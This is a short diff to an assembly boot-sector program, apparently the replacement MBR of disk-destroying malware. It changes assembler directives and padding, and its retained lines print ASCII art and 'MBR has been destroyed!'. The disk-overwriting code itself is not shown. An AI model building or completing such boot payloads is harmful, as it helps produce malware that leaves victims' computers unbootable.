@@ -1,12 +1,12 @@
+;---------------------------------------------------
 
-; DOSBox Emulator and Borland Turbo Assembler needed.
-; tasm.exe program.asm
-; tlink.exe program.obj
-; PE file is created. We need to extract the bootloader code that ends with (55 AA).
-; and apply NULL padding to 512 bytes.
-.model small
-.code
-org 7C00h
+.386						; Compile for a 80386 CPU
+option segment:use16		; Force 16 bit segments instead of default 32 bit
+.model tiny					; Tiny memory model
+.code						; Start of code segment
+org 07C00h					; Bootloader entry point
+;---------------------------------------------------
+
 start:
     mov ah, 06h        ; Clear screen and set attributes in one go
     mov bh, 04h        ; Page number for video functions
@@ -44,5 +44,7 @@ ascii_art db "          uuUUUUUUUUuu          ",0Dh,0Ah
           db "           UUUUUUUUU  ",0Dh,0Ah
           db 0Dh,0Ah   ; Double line break
           db "MBR has been destroyed!",0Dh,0Ah
-		  db 00h, 55h, 0AAh
+		  db 00h
+db 510-($-start) dup(0)
+dw 0AA55h
 end start
